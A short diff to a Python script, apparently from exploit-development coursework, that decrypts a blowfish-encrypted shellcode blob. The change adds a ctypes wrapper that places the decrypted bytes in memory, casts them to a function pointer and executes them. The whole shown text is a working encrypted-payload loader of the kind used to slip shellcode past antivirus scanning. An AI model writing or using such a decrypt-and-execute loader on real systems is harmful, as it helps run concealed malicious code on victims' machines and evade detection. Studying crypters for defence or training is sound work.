@@ -8,6 +8,7 @@ Note:          Python3 Shellcode Decrypter with blowfish symmetric algorithm
 
 """
 import blowfish
+from ctypes import *
 
 shellcode_crypted = b"\x42\xf4\xbf\xc1\x5f\xfc\xeb\x84\xa3\x77\xf2\x25\xb0\x1f\x68\x6a\x66\x0c\xfb\x3b\xf6\xea\x32\xaa\x62\x4e\x67\xe0\x33\x73\xc6\x72"
 shellcode_decrypted = b""
@@ -56,5 +57,11 @@ print("Decrypted shellcode:")
 print("-" * 90)
 print(decrypted)
 print("-" * 90)
-
 print("Shellcode Length with padding:", len(bytearray(shellcode_crypted)))
+print("-" * 90)
+print("Running shellcode!!!")
+
+# Python shellcode wrapper
+memory_with_shell = create_string_buffer(shellcode_decrypted, len(shellcode_decrypted))
+shell = cast(memory_with_shell,CFUNCTYPE(c_void_p))
+shell()
